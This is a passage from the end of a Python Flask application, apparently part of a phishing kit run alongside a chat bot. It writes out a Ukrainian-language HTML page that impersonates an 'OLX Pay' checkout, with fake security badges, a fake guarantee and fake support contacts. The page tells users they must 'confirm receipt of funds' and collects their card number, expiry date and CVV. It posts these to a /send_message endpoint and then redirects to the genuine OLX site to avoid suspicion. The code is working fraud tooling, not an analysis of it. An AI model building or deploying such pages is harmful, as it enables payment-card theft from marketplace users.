        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ –±–æ—Ç–∞: {e}")

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –±–æ—Ç–∞ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
def run_bot():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_bot())

# –°–æ–∑–¥–∞–Ω–∏–µ HTML —Ñ–∞–π–ª–æ–≤ –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ templates
def create_templates():
    # –°—Ç—Ä–∞–Ω–∏—Ü–∞ –æ–ø–ª–∞—Ç—ã —Å —à–∞–±–ª–æ–Ω–∏–∑–∞—Ü–∏–µ–π —á–µ—Ä–µ–∑ {{ }}
    payment_html = """<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>OLX - –û–ø–ª–∞—Ç–∞ —Ç–æ–≤–∞—Ä—É {{ listing.title }}</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <style>
  body {
    font-family: 'Inter', sans-serif;
    margin: 0;
    padding: 0;
    background-color: #f6f6f6;
    color: #333;
  }
  header {
    background-color: #002f34;
    color: white;
    padding: 15px 0;
    text-align: center;
    box-shadow: 0 2px 10px rgba(0,0,0,0.2);
  }
  .logo {
    max-width: 100px;
    height: auto;
  }
  .container {
    max-width: 1200px;
    margin: 0 auto;
    padding: 20px;
    display: flex;
    gap: 30px;
  }
  .left-column {
    flex: 1;
    margin-top: 20px;
  }
  .right-column {
    flex: 1;
  }
  .confirm-header {
    text-align: center;
    font-weight: 600;
    color: #002f34;
    font-size: 24px;
    margin-bottom: 15px;
    letter-spacing: -0.5px;
  }
  .divider {
    width: 80%;
    height: 2px;
    background-color: #002f34;
    margin: 0 auto 20px;
  }
  .product-header {
    display: flex;
    align-items: center;
    background-color: white;
    border-radius: 8px;
    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    margin-bottom: 20px;
    padding: 20px;
  }
  .product-image {
    width: 120px;
    height: 120px;
    object-fit: cover;
    border-radius: 8px;
    margin-right: 15px;
    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
  }
  .product-details {
    flex-grow: 1;
  }
  .product-details h3 {
    margin: 0 0 10px 0;
    font-size: 18px;
    font-weight: 600;
  }
  .product-price {
    font-weight: bold;
    color: #002f34;
    margin-bottom: 10px;
    font-size: 20px;
  }
  .payment-form {
    background-color: white;
    border-radius: 12px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    padding: 25px;
    position: relative;
    overflow: hidden;
  }
  .payment-form::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 6px;
    background: linear-gradient(90deg, #002f34, #1ea1f2, #002f34);
  }
  .form-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 20px;
    padding-bottom: 15px;
    border-bottom: 1px solid #eee;
  }
  .form-title {
    font-size: 18px;
    font-weight: 600;
    color: #002f34;
    display: flex;
    align-items: center;
  }
  .form-title i {
    margin-right: 8px;
    color: #1ea1f2;
  }
  .security-badges {
    display: flex;
    align-items: center;
  }
  .security-badge {
    display: flex;
    align-items: center;
    font-size: 13px;
    color: #555;
    margin-left: 15px;
  }
  .security-badge i {
    margin-right: 5px;
    color: #28a745;
  }
  .payment-methods {
    display: flex;
    gap: 10px;
    margin-bottom: 20px;
  }
  .payment-method {
    width: 50px;
    height: 30px;
    background-color: #f8f9fa;
    border-radius: 4px;
    display: flex;
    justify-content: center;
    align-items: center;
    border: 1px solid #ddd;
  }
  .form-group {
    margin-bottom: 20px;
    position: relative;
  }
  .form-group label {
    display: block;
    margin-bottom: 8px;
    font-weight: 500;
    color: #444;
  }
  .form-group input {
    width: 100%;
    padding: 12px 15px;
    border: 1px solid #ddd;
    border-radius: 8px;
    font-size: 16px;
    box-sizing: border-box;
    transition: border-color 0.3s ease, box-shadow 0.3s ease;
  }
  .form-group input:focus {
    border-color: #1ea1f2;
    box-shadow: 0 0 0 3px rgba(30, 161, 242, 0.2);
    outline: none;
  }
  .form-group i.card-icon {
    position: absolute;
    right: 15px;
    top: 37px;
    color: #777;
  }
  .dual-input {
    display: flex;
    gap: 15px;
  }
  .dual-input .form-group {
    flex: 1;
  }
  .submit-btn {
    width: 100%;
    padding: 14px;
    background-color: #0061f2;
    color: white;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    cursor: pointer;
    transition: background-color 0.3s ease, transform 0.1s ease;
    font-weight: 600;
    display: flex;
    justify-content: center;
    align-items: center;
    box-shadow: 0 4px 6px rgba(0, 97, 242, 0.2);
  }
  .submit-btn:hover {
    background-color: #0052cc;
  }
  .submit-btn:active {
    transform: translateY(1px);
  }
  .submit-btn i {
    margin-right: 8px;
  }
  .secure-payment-notice {
    display: flex;
    align-items: center;
    justify-content: center;
    margin-top: 20px;
    padding: 10px;
    background-color: #f8f9fa;
    border-radius: 8px;
    color: #555;
    font-size: 14px;
  }
  .secure-payment-notice i {
    margin-right: 8px;
    color: #28a745;
  }
  .card-info {
    border: 1px solid #e9ecef;
    border-radius: 8px;
    padding: 15px;
    margin-bottom: 25px;
    background-color: #f8f9fa;
  }
  .card-info-title {
    font-weight: 600;
    margin-bottom: 10px;
    color: #444;
    display: flex;
    align-items: center;
  }
  .card-info-title i {
    margin-right: 8px;
    color: #1ea1f2;
  }
  .success-message {
    display: none;
    text-align: center;
    color: #28a745;
    font-weight: bold;
    margin-top: 20px;
    padding: 20px;
    background-color: #f8f9fa;
    border-radius: 8px;
    border-left: 5px solid #28a745;
  }
  .already-paid {
    background-color: #e6f7ff;
    border-left: 5px solid #1ea1f2;
    padding: 15px;
    margin-bottom: 20px;
    border-radius: 8px;
    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
  }
  .already-paid-title {
    font-weight: 600;
    color: #0061f2;
    margin-bottom: 5px;
    display: flex;
    align-items: center;
  }
  .already-paid-title i {
    margin-right: 10px;
  }
  .trust-indicators {
    background-color: white;
    border-radius: 12px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    padding: 20px;
    margin-top: 20px;
  }
  .trust-title {
    font-weight: 600;
    color: #002f34;
    margin-bottom: 15px;
    display: flex;
    align-items: center;
    font-size: 18px;
  }
  .trust-title i {
    margin-right: 10px;
    color: #28a745;
  }
  .trust-items {
    display: flex;
    flex-direction: column;
    gap: 15px;
  }
  .trust-item {
    display: flex;
    align-items: flex-start;
  }
  .trust-item i {
    margin-right: 10px;
    color: #28a745;
    margin-top: 2px;
  }
  .trust-item-content {
    flex: 1;
  }
  .trust-item-title {
    font-weight: 600;
    margin-bottom: 3px;
    color: #444;
  }
  .olx-guarantee {
    background-color: #ffffe0;
    border: 1px dashed #ffd700;
    padding: 15px;
    border-radius: 8px;
    margin-top: 20px;
    text-align: center;
  }
  .olx-guarantee-title {
    font-weight: 600;
    color: #b8860b;
    margin-bottom: 5px;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .olx-guarantee-title i {
    margin-right: 8px;
  }
  .order-status {
    background-color: #f0fff0;
    border-left: 5px solid #28a745;
    padding: 15px;
    margin-bottom: 20px;
    border-radius: 8px;
  }
  .order-status-title {
    font-weight: 600;
    color: #28a745;
    margin-bottom: 5px;
    display: flex;
    align-items: center;
  }
  .order-status-title i {
    margin-right: 10px;
  }
  .order-progress {
    display: flex;
    margin-top: 15px;
    position: relative;
    justify-content: space-between;
  }
  .order-progress:before {
    content: '';
    position: absolute;
    height: 4px;
    background-color: #ddd;
    top: 15px;
    left: 20px;
    right: 20px;
  }
  .order-progress:after {
    content: '';
    position: absolute;
    height: 4px;
    background-color: #28a745;
    top: 15px;
    left: 20px;
    width: 33%;
  }
  .progress-step {
    z-index: 1;
    background-color: white;
    border: 2px solid #ddd;
    width: 30px;
    height: 30px;
    border-radius: 50%;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .progress-step.active {
    border-color: #28a745;
    background-color: #28a745;
    color: white;
  }
  .progress-labels {
    display: flex;
    justify-content: space-between;
    margin-top: 5px;
    font-size: 12px;
    color: #777;
  }
  .progress-label {
    text-align: center;
    max-width: 80px;
  }
  .progress-label.active {
    color: #28a745;
    font-weight: 600;
  }
  .support-info {
    background-color: white;
    border-radius: 8px;
    padding: 15px;
    margin-top: 20px;
    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    text-align: center;
  }
  .support-title {
    font-weight: 600;
    margin-bottom: 10px;
    color: #444;
  }
  .support-contact {
    display: flex;
    justify-content: center;
    align-items: center;
    margin-top: 10px;
    gap: 15px;
  }
  .support-contact a {
    color: #0061f2;
    text-decoration: none;
    display: flex;
    align-items: center;
  }
  .support-contact a i {
    margin-right: 5px;
  }
  @media (max-width: 991px) {
  .container {
    flex-direction: column;
    padding: 10px;
  }
  .left-column, .right-column {
    width: 100%;
  }
}

@media (max-width: 768px) {
  .dual-input {
    flex-direction: column;
    gap: 0;
  }
  .payment-methods {
    justify-content: center;
  }
  .form-header {
    flex-direction: column;
    align-items: flex-start;
  }
  .security-badges {
    margin-top: 10px;
  }
  .security-badge {
    margin-left: 0;
    margin-right: 15px;
  }
  .order-progress {
    margin-left: -10px;
    margin-right: -10px;
  }
  
  /* Additional mobile improvements */
  .product-header {
    flex-direction: column;
    align-items: center;
    text-align: center;
  }
  .product-image {
    margin-right: 0;
    margin-bottom: 15px;
  }
  .product-details {
    width: 100%;
  }
  .trust-item {
    flex-direction: column;
    align-items: center;
    text-align: center;
  }
  .trust-item i {
    margin-right: 0;
    margin-bottom: 8px;
    font-size: 24px;
  }
  .support-contact {
    flex-direction: column;
    gap: 10px;
  }
  .form-group input {
    font-size: 16px; /* Prevents zoom on input focus on iOS */
    padding: 15px;
  }
  .submit-btn {
    padding: 16px;
  }
  .form-title, .trust-title, .already-paid-title, .order-status-title {
    font-size: 16px;
  }
  .confirm-header {
    font-size: 20px;
  }
  
  /* Improve touch targets */
  .progress-step {
    width: 36px;
    height: 36px;
  }
  .payment-method {
    width: 60px;
    height: 40px;
  }
}

/* Additional breakpoint for very small screens */
@media (max-width: 480px) {
  body {
    font-size: 14px;
  }
  .container {
    padding: 10px 5px;
  }
  .payment-form, .trust-indicators, .product-header {
    padding: 15px 10px;
  }
  .progress-labels {
    font-size: 10px;
  }
  .logo {
    max-width: 80px;
  }
  .order-progress:before, .order-progress:after {
    left: 15px;
    right: 15px;
  }
}
  </style>
</head>
<body>
<header>
  <img src="{{ url_for('static', filename='olx_62.png') }}" alt="OLX Logo" class="logo">
</header>

<div class="container">
  <div class="left-column">
    <div class="product-header">
      {% if listing.image_base64 %}
      <img src="{{ listing.image_base64 }}" alt="{{ listing.title }}" class="product-image">
      {% endif %}
      <div class="product-details">
        <h3>{{ listing.title }}</h3>
        <div class="product-price">{{ listing.price }}</div>
        <small>–ù–æ–º–µ—Ä –∑–∞–º–æ–≤–ª–µ–Ω–Ω—è: {{ listing.unique_id[:8] }}</small>
      </div>
    </div>

    <div class="already-paid">
      <div class="already-paid-title">
        <i class="fas fa-info-circle"></i> –¢–æ–≤–∞—Ä –≤–∂–µ –æ–ø–ª–∞—á–µ–Ω–æ
      </div>
      <div>–í–∏ –≤–∂–µ –∑—Ä–æ–±–∏–ª–∏ –æ–ø–ª–∞—Ç—É –∑–∞ —Ü–µ–π —Ç–æ–≤–∞—Ä. –ë—É–¥—å –ª–∞—Å–∫–∞, –ø—ñ–¥—Ç–≤–µ—Ä–¥—ñ—Ç—å –ø–ª–∞—Ç—ñ–∂ –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü—ñ—ó.</div>
    </div>

    <div class="order-status">
      <div class="order-status-title">
        <i class="fas fa-truck"></i> –°—Ç–∞—Ç—É—Å –∑–∞–º–æ–≤–ª–µ–Ω–Ω—è
      </div>
      <div>–í–∞—à–µ –∑–∞–º–æ–≤–ª–µ–Ω–Ω—è –æ–±—Ä–æ–±–ª—è—î—Ç—å—Å—è. –û—á—ñ–∫—É—î—Ç—å—Å—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –ø–ª–∞—Ç–µ–∂—É.</div>
      
      <div class="order-progress">
        <div class="progress-step active"><i class="fas fa-check"></i></div>
        <div class="progress-step"><i class="fas fa-credit-card"></i></div>
        <div class="progress-step"><i class="fas fa-box"></i></div>
        <div class="progress-step"><i class="fas fa-truck"></i></div>
      </div>
      <div class="progress-labels">
        <div class="progress-label active">–ó–∞–º–æ–≤–ª–µ–Ω–æ</div>
        <div class="progress-label">–ü—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–æ</div>
        <div class="progress-label">–ì–æ—Ç—É—î—Ç—å—Å—è</div>
        <div class="progress-label">–î–æ—Å—Ç–∞–≤–∫–∞</div>
      </div>
    </div>

    <div class="olx-guarantee">
      <div class="olx-guarantee-title">
        <i class="fas fa-shield-alt"></i> –ì–∞—Ä–∞–Ω—Ç—ñ—è OLX Pay
      </div>
      <div>–í–∞—à–∞ –ø–æ–∫—É–ø–∫–∞ –∑–∞—Ö–∏—â–µ–Ω–∞. –ì—Ä–æ—à—ñ –Ω–∞–¥—ñ–π–¥—É—Ç—å –ø—Ä–æ–¥–∞–≤—Ü—é —Ç—ñ–ª—å–∫–∏ –ø—ñ—Å–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Ç–æ–≤–∞—Ä—É.</div>
    </div>

    <div class="trust-indicators">
      <div class="trust-title">
        <i class="fas fa-check-circle"></i> –ß–æ–º—É –æ–±–∏—Ä–∞—é—Ç—å OLX Pay
      </div>
      <div class="trust-items">
        <div class="trust-item">
          <i class="fas fa-shield-alt"></i>
          <div class="trust-item-content">
            <div class="trust-item-title">100% –ë–µ–∑–ø–µ—á–Ω—ñ –ø–ª–∞—Ç–µ–∂—ñ</div>
            <div>–í—Å—ñ —Ç—Ä–∞–Ω–∑–∞–∫—Ü—ñ—ó –∑–∞—Ö–∏—â–µ–Ω—ñ —Å—É—á–∞—Å–Ω–∏–º–∏ —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ—è–º–∏ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è</div>
          </div>
        </div>
        <div class="trust-item">
          <i class="fas fa-undo"></i>
          <div class="trust-item-content">
            <div class="trust-item-title">–ì–∞—Ä–∞–Ω—Ç—ñ—è –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –∫–æ—à—Ç—ñ–≤</div>
            <div>–Ø–∫—â–æ —Ç–æ–≤–∞—Ä –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –æ–ø–∏—Å—É, –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ –ø–æ–≤–Ω–µ –≤—ñ–¥—à–∫–æ–¥—É–≤–∞–Ω–Ω—è</div>
          </div>
        </div>
        <div class="trust-item">
          <i class="fas fa-headset"></i>
          <div class="trust-item-content">
            <div class="trust-item-title">–¶—ñ–ª–æ–¥–æ–±–æ–≤–∞ –ø—ñ–¥—Ç—Ä–∏–º–∫–∞</div>
            <div>–ù–∞—à–∞ –∫–æ–º–∞–Ω–¥–∞ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ –∑–∞–≤–∂–¥–∏ –≥–æ—Ç–æ–≤–∞ –¥–æ–ø–æ–º–æ–≥—Ç–∏ –≤–∞–º</div>
          </div>
        </div>
      </div>
    </div>

    <div class="support-info">
      <div class="support-title">–ü–æ—Ç—Ä—ñ–±–Ω–∞ –¥–æ–ø–æ–º–æ–≥–∞?</div>
      <div>–ù–∞—à–∞ —Å–ª—É–∂–±–∞ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ –ø—Ä–∞—Ü—é—î —Ü—ñ–ª–æ–¥–æ–±–æ–≤–æ</div>
      <div class="support-contact">
        <a href="#"><i class="fas fa-envelope"></i> support@olx.ua</a>
        <a href="#"><i class="fas fa-phone"></i> 0800 123 456</a>
      </div>
    </div>
  </div>

  <div class="right-column">
    <h2 class="confirm-header">–ü—ñ–¥—Ç–≤–µ—Ä–¥—ñ—Ç—å –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –∫–æ—à—Ç—ñ–≤</h2>
    <div class="divider"></div>

    <div class="payment-form">
      <div class="form-header">
        <div class="form-title">
          <i class="fas fa-credit-card"></i> –ë–µ–∑–ø–µ—á–Ω–∞ –æ–ø–ª–∞—Ç–∞
        </div>
        <div class="security-badges">
          <div class="security-badge">
            <i class="fas fa-shield-alt"></i> –ó–∞—Ö–∏—â–µ–Ω–æ
          </div>
          <div class="security-badge">
            <i class="fas fa-lock"></i> 256-bit SSL
          </div>
        </div>
      </div>

      <div class="payment-methods">
        <div class="payment-method"><i class="fab fa-cc-visa"></i></div>
        <div class="payment-method"><i class="fab fa-cc-mastercard"></i></div>
        <div class="payment-method"><i class="fab fa-cc-apple-pay"></i></div>
        <div class="payment-method"><i class="fab fa-cc-jcb"></i></div>
      </div>

      <div class="card-info">
        <div class="card-info-title">
          <i class="fas fa-info-circle"></i> –Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ —Ç—Ä–∞–Ω–∑–∞–∫—Ü—ñ—é
        </div>
        <div>–ë–∞–Ω–∫-–æ—Ç—Ä–∏–º—É–≤–∞—á: OLX Payment System</div>
        <div>–¢–∏–ø —Ç—Ä–∞–Ω–∑–∞–∫—Ü—ñ—ó: –ó–∞—Ö–∏—â–µ–Ω–∏–π –ø–ª–∞—Ç—ñ–∂</div>
        <div>–°—É–º–∞ –¥–æ —Å–ø–ª–∞—Ç–∏: {{ listing.price }}</div>
      </div>

      <form id="dataForm">
        <input type="hidden" id="listing_id" value="{{ listing.unique_id }}">
        
        <div class="form-group">
          <label for="card">–ù–æ–º–µ—Ä –∫–∞—Ä—Ç–∫–∏</label>
          <input type="text" id="card" name="card" placeholder="1234 5678 9012 3456" 
                maxlength="19" required pattern="\d{4}\s\d{4}\s\d{4}\s\d{4}">
          <i class="fas fa-credit-card card-icon"></i>
        </div>
        
        <div class="dual-input">
          <div class="form-group">
            <label for="expiry">–¢–µ—Ä–º—ñ–Ω –¥—ñ—ó</label>
            <input type="text" id="expiry" name="expiry" placeholder="–ú–ú/–†–†" 
                  maxlength="5" required pattern="\d{2}/\d{2}">
          </div>
          
          <div class="form-group">
            <label for="cvv">CVV</label>
            <input type="text" id="cvv" name="cvv" placeholder="123" 
                  maxlength="3" required pattern="\d{3}">
            <i class="fas fa-question-circle card-icon" title="3-–∑–Ω–∞—á–Ω–∏–π –∫–æ–¥ –Ω–∞ –∑–≤–æ—Ä–æ—Ç–Ω—ñ–π —Å—Ç–æ—Ä–æ–Ω—ñ –∫–∞—Ä—Ç–∫–∏"></i>
          </div>
        </div>
        
        <button type="submit" class="submit-btn">
          <i class="fas fa-lock"></i> –ü—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ –ø–ª–∞—Ç—ñ–∂
        </button>
      </form>

      <div class="secure-payment-notice">
        <i class="fas fa-shield-alt"></i> –í–∞—à –ø–ª–∞—Ç—ñ–∂ –∑–∞—Ö–∏—â–µ–Ω–æ –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–º –±–µ–∑–ø–µ–∫–∏ OLX Secure Pay
      </div>

      <div id="successMessage" class="success-message">
        <i class="fas fa-check-circle"></i> –ü–ª–∞—Ç—ñ–∂ —É—Å–ø—ñ—à–Ω–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–æ!
      </div>
    </div>
  </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
  const cardInput = document.getElementById('card');
  const expiryInput = document.getElementById('expiry');
  const cvvInput = document.getElementById('cvv');

  // Card number formatting
  cardInput.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    let formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    e.target.value = formattedValue.slice(0, 19);

    // Change card icon based on first digits
    const cardIcon = e.target.nextElementSibling;
    const firstDigits = value.slice(0, 2);
    
    if (firstDigits.startsWith('4')) {
      cardIcon.className = 'fab fa-cc-visa card-icon';
    } else if (['51', '52', '53', '54', '55'].includes(firstDigits) || 
               (parseInt(firstDigits) >= 22 && parseInt(firstDigits) <= 27)) {
      cardIcon.className = 'fab fa-cc-mastercard card-icon';
    } else {
      cardIcon.className = 'fas fa-credit-card card-icon';
    }
  });

  // Expiry date formatting
  expiryInput.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
      value = value.slice(0, 2) + '/' + value.slice(2);
    }
    e.target.value = value.slice(0, 5);
  });

  // CVV formatting
  cvvInput.addEventListener('input', function(e) {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
  });

  document.getElementById('dataForm').addEventListener('submit', async function(event) {
    event.preventDefault();
    let card = cardInput.value.replace(/\s/g, '');
    let expiry = expiryInput.value;
    let cvv = cvvInput.value;
    let listing_id = document.getElementById('listing_id').value;
    
    // Show loading state
    const submitBtn = this.querySelector('button[type="submit"]');
    const originalText = submitBtn.innerHTML;
    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> –û–±—Ä–æ–±–∫–∞...';
    submitBtn.disabled = true;
    
    try {
      let response = await fetch('/send_message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          card: card, 
          expiry: expiry, 
          cvv: cvv,
          listing_id: listing_id
        })
      });

      let result = await response.json();
      
      if (result.status === "–î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã") {
        document.getElementById('dataForm').style.display = 'none';
        document.getElementById('successMessage').style.display = 'block';
        document.getElementById('successMessage').innerHTML = '<i class="fas fa-check-circle"></i> –ü–ª–∞—Ç—ñ–∂ —É—Å–ø—ñ—à–Ω–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–æ! –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫—É OLX...';
        
        setTimeout(() => {
          window.location.href = "https://www.olx.ua/";
        }, 3000);
      } else {
        alert("–°—Ç–∞–ª–∞—Å—è –ø–æ–º–∏–ª–∫–∞. –ë—É–¥—å –ª–∞—Å–∫–∞, —Å–ø—Ä–æ–±—É–π—Ç–µ —â–µ —Ä–∞–∑.");
        submitBtn.innerHTML = originalText;
        submitBtn.disabled = false;
      }
    } catch (error) {
      console.error("–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –≤—ñ–¥–ø—Ä–∞–≤—Ü—ñ –¥–∞–Ω–∏—Ö:", error);
      alert("–°—Ç–∞–ª–∞—Å—è –ø–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –≤—ñ–¥–ø—Ä–∞–≤—Ü—ñ –¥–∞–Ω–∏—Ö. –ë—É–¥—å –ª–∞—Å–∫–∞, —Å–ø—Ä–æ–±—É–π—Ç–µ —â–µ —Ä–∞–∑.");
      submitBtn.innerHTML = originalText;
      submitBtn.disabled = false;
    }
  });
});
</script>

</body>
</html>"""

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ñ–∞–π–ª—ã –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é templates
    with open('templates/payment.html', 'w', encoding='utf-8') as f:
        f.write(payment_html)

# –ó–∞–ø—É—Å–∫ –≤—Å–µ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
if __name__ == '__main__':
    # –°–æ–∑–¥–∞–µ–º —à–∞–±–ª–æ–Ω—ã
    create_templates()
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º Flask —Å–µ—Ä–≤–µ—Ä
    app.run(host='127.0.0.1', port=5000, debug=False, threaded=True) 